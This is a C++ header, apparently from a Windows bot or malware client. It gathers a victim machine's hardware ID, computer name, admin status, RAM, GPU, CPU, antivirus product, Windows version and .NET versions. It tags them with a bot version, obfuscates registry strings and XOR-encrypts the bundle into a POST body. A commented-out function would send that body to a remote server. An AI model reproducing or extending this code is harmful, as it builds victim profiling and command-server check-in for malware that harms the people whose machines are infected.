
#pragma once
#include <fstream>
#include <hstring.h>


class Client
{
public:

	std::string checkIfRegKeyExists(std::string key) {
		LONG lResult;
		HKEY hKey;
		lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
		if (lResult != ERROR_SUCCESS) {
			if (lResult == ERROR_FILE_NOT_FOUND) {
				return "false";
			}
		}
		return "true";
	}


	

	static std::string returnFinalPost() {
		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
		std::string net3 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0"));
		std::string net35 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5"));
		std::string net4 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4"));

		std::string cpuName = base64_encode((const unsigned char*)OsHelpers::getCpuName().c_str(), OsHelpers::getCpuName().length());
		std::cout << cpuName;
	
		std::string prcessorArchitecture = base64_encode((const unsigned char*)OsHelpers::PrcessorArchitecture().c_str(), OsHelpers::PrcessorArchitecture().length());
		std::cout << prcessorArchitecture;
		
		std::string gpuName = base64_encode((const unsigned char*)OsHelpers::getGpuName().c_str(), OsHelpers::getGpuName().length());
		std::string av = base64_encode((const unsigned char*)Helpers::getCurrentAv().c_str(), Helpers::getCurrentAv().length());
	
		std::string winver = base64_encode((const unsigned char*)Helpers::GetWindowsVersionString().c_str(), Helpers::GetWindowsVersionString().length());

		std::string args = 
			"hwid=" + Helpers::GetMachineGUID() +
			"&computername=" + Helpers::getComputerName() +
			"&aornot=" + OsHelpers::checkPEIsAdmin() +
			"&installedRam=" + OsHelpers::getRam() +
			"&netFramework2=" + net2 +
			"&netFramework3=" + net3 +
			"&netFramework35=" + net35 +
			"&netFramework4=" + net4 +
			"&antivirus=" + av +
			"&botversion=2.1" +
			"&gpuName=" + gpuName +
			"&cpuName=" + cpuName +
			"&arch=" + prcessorArchitecture +
			"&operingsystem=" + winver;
		std::string finalPost = "request=" + XOR::encryptReqeust(args);
		
		return finalPost;
		
		//return "";
	}
	/*

	static std::string sendPost(std::string url, std::string params) {
		Config config;

		http::Request request2(url);
		http::Response respons2e = request2.send("POST",
			params,
			{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
		);

		return Helpers::responseToString(respons2e);
	}
	*/
};

